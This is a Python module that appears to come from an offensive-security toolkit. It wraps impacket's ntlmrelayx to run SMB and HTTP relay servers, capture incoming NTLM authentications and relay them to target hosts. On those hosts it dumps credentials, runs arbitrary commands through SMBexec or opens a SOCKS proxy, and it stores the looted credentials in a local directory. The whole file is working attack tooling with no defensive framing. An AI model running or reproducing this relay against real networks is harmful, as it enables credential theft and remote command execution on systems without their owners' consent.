"""
NTLM Relay — relay captured NTLM authentications to target systems.

Wraps impacket's ntlmrelayx to set up relay servers (SMB/HTTP) that capture
incoming NTLM authentications and relay them to target systems for credential
dumping, command execution, or SOCKS proxying.
"""

import asyncio
import logging
import shutil
from .cli_tools import _run_cli
from typing import Any

from impacket.examples import logger as impacket_logger

logging.getLogger("impacket").setLevel(logging.ERROR)
impacket_logger.init(ts=False, debug=False)


async def ad_ntlm_relay(
    target: str = "",
    targets_file: str = "",
    command: str = "",
    socks_mode: bool = False,
    smb_server: bool = True,
    http_server: bool = True,
    smb2support: bool = True,
    loot_dir: str = "/tmp/ntlmrelayx_loot",
    timeout: int = 60,
) -> dict:
    """Run an NTLM relay server to capture and relay authentications.

    Starts ntlmrelayx listening for incoming NTLM auth (SMB/HTTP) and
    relays captured credentials to the specified target(s).

    Args:
        target:        Single target IP/hostname to relay to.
        targets_file:  File with targets (one per line) — alternative to target.
        command:       Command to execute on relayed target (via SMBexec).
        socks_mode:    Start a SOCKS proxy instead of one-shot attacks.
        smb_server:    Enable SMB relay server (default True).
        http_server:   Enable HTTP relay server (default True).
        smb2support:   Enable SMB2 support (default True).
        loot_dir:      Directory to store looted credentials.
        timeout:       Seconds to run the relay server (default 60).

    Returns:
        A dict with target, executed, output, socks_active, and error fields.
    """
    result: dict[str, Any] = {
        "target": target or targets_file,
        "executed": False,
        "output": "",
        "socks_active": False,
        "error": None,
    }

    if not target and not targets_file:
        result["error"] = "Either target or targets_file must be provided."
        return result

    if isinstance(timeout, bool) or not isinstance(timeout, int) or not 1 <= timeout <= 3600:
        result["error"] = "timeout must be an integer between 1 and 3600 seconds."
        return result

    script = shutil.which("ntlmrelayx.py")
    if not script:
        result["error"] = "ntlmrelayx.py not found in PATH."
        return result

    cmd: list[str] = ["python3", script]

    if target:
        cmd.extend(["-t", target])
    elif targets_file:
        cmd.extend(["-tf", targets_file])

    if command:
        cmd.extend(["-c", command])

    if socks_mode:
        cmd.append("-socks")

    if not smb_server:
        cmd.append("--no-smb-server")

    if not http_server:
        cmd.append("--no-http-server")

    if smb2support:
        cmd.append("-smb2support")

    cmd.extend(["-l", loot_dir])

    try:
        run = await _run_cli(cmd, timeout=timeout)
        failed = run["exit_code"] != 0 or run.get("error_kind") or run.get("output_truncated")
        result["executed"] = not bool(failed)
        result["output_truncated"] = bool(run.get("output_truncated"))
        if failed:
            result["error"] = "Relay execution incomplete or failed; server is not active."
        else:
            result["output"] = run["stdout"].strip()

    except Exception as exc:
        result["error"] = "Relay execution failed."

    return result
